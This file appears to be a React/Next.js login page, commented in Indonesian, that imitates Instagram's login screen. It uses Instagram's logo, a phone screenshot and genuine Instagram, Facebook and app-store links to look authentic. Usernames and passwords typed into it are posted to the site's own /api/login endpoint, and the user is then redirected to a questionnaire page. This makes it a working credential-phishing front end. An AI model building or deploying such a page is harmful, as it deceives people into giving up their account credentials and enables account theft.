import { useState } from "react";
import { useRouter } from "next/router";
import styles from "../styles/Login.module.css";
import LoadingPage from "../components/LoadingPage"; // Import LoadingPage component

export default function Login() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [formError, setFormError] = useState(false);
  const [loading, setLoading] = useState(false); // State untuk menunjukkan status loading
  const router = useRouter();

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!username || !password) {
      setFormError(true);
      return;
    }

    setLoading(true); // Aktifkan loading saat proses login dimulai

    try {
      const res = await fetch("/api/login", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ username, password }),
      });

      if (res.ok) {
        // Tunggu 1 detik sebelum navigasi ke halaman berikutnya
        setTimeout(() => {
          router.push("/kuisioner");
        }, 1000);
      } else {
        console.error("Login failed");
        setFormError(true);
      }
    } catch (error) {
      console.error("Error during login:", error);
      setFormError(true);
    } finally {
      // Nonaktifkan loading setelah proses selesai
      setTimeout(() => {
        setLoading(false);
      }, 1000); // Sesuaikan dengan durasi penundaan yang Anda inginkan
    }
  };
  return (
    <div className={styles.container}>
      {loading ? (
        <LoadingPage /> // Tampilkan LoadingPage jika loading true
      ) : (
        <div className={styles.wrapper}>
          <div className={styles.phone}>
            <img
              src="/screenshot.png"
              alt="screenshot"
              className={styles.phoneImage}
            />
          </div>
          <div className={styles.formContainer}>
            <div className={styles.form}>
              <img
                src="/instagram2.png"
                alt="instagram2"
                className={styles.logo}
              />
              <form className={styles.formContent} onSubmit={handleSubmit}>
                <input
                  type="text"
                  placeholder="Phone number, username, or email"
                  className={`${styles.input} ${
                    formError && styles.inputError
                  }`}
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                />
                <input
                  type="password"
                  placeholder="Password"
                  className={`${styles.input} ${
                    formError && styles.inputError
                  }`}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />
                {formError && (
                  <p className={styles.errorText}>
                    Username or password is incorrect.
                  </p>
                )}
                <button type="submit" className={styles.button}>
                  Log In
                </button>
              </form>
              <div className={styles.additionalLinks}>
                <div className={styles.orDivider}>
                  <div className={styles.line}></div>
                  <div className={styles.orText}>OR</div>
                  <div className={styles.line}></div>
                </div>
                <a
                  href="https://www.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%2522f9tq4a1sdobdjtave2f369nhitphpsr1a83lbk3vmsri1yqe5m%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D7fe449a4-7219-49b7-91f9-9dfb96aef6bf%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522f9tq4a1sdobdjtave2f369nhitphpsr1a83lbk3vmsri1yqe5m%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=page&locale=en_GB&pl_dbl=0"
                  className={styles.facebookLogin}
                >
                  Log in with Facebook
                </a>
                <a
                  href="https://www.instagram.com/accounts/password/reset/"
                  className={styles.forgot}
                >
                  Forgot password?
                </a>
                {/* <div className={styles.signup}>
                  Don't have an account?{" "}
                  <a
                    href="https://www.instagram.com/accounts/emailsignup/"
                    target="_blank"
                    rel="noopener noreferrer"
                  >
                    Sign up
                  </a>
                </div> */}
                <div className={styles.getApp}>
                  <span>Get the app</span>
                  <div className={styles.appStores}>
                    <a
                      href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3DCD847686-2CC8-49D7-873A-239DF5E2EB75%26utm_campaign%3DunifiedHome%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge&pli=1"
                      target="_blank"
                      rel="noopener noreferrer"
                    >
                      <img src="/googleplay.png" alt="Google Play" />
                    </a>
                    <a href="ms-windows-store://pdp/?productid=9nblggh5l9xt&referrer=appbadge&source=www.instagram.com&mode=mini&pos=0%2C0%2C1920%2C1020">
                      <img src="/microsoft.png" alt="Microsoft Store" />
                    </a>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
